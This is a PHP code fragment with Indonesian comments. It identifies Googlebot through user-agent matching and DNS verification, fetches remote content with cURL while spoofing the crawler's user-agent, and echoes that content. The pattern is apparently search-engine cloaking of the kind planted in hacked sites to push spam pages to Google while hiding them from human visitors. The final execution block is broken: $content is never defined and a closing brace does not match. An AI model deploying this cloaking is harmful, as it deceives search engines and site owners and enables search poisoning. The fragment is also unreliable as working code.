function is_google_bot() {
    // 1. Cek User-Agent dulu (fast check)
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $google_agents = [
        "Googlebot", 
        "AdsBot-Google", 
        "Mediapartners-Google", 
        "Google-Site-Verification", 
        "Google-InspectionTool", 
        "Googlebot-Mobile", 
        "Googlebot-News",
        "Googlebot-Image",
        "Googlebot-Video"
    ];
    
    $is_google_agent = false;
    foreach ($google_agents as $agent) {
        if (stripos($user_agent, $agent) !== false) { // stripos = case insensitive
            $is_google_agent = true;
            break;
        }
    }
    
    if (!$is_google_agent) {
        return false;
    }
    
    // 2. Verifikasi dengan reverse DNS lookup (validasi IP)
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Cek apakah IP valid
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        return false;
    }
    
    // Lakukan reverse DNS
    $hostname = gethostbyaddr($ip);
    
    // Cek apakah hostname berasal dari Google
    if (strpos($hostname, '.googlebot.com') !== false || 
        strpos($hostname, '.google.com') !== false) {
        
        // 3. Verifikasi forward DNS (pastikan hostname resolve ke IP yang sama)
        $forward_ips = gethostbynamel($hostname);
        if ($forward_ips !== false && in_array($ip, $forward_ips)) {
            return true;
        }
    }
    
    return false;
}

// Ambil konten dengan timeout dan error handling
function get_google_content($url) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Googlebot',
    ]);
    
    $response = curl_exec($ch);
    $error = curl_error($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($error || $http_code !== 200) {
        // Log error atau tampilkan pesan default
        return "<!-- Content temporarily unavailable -->";
    }
    
    return $response;
}

// Eksekusi

    echo $content;
    exit;
}
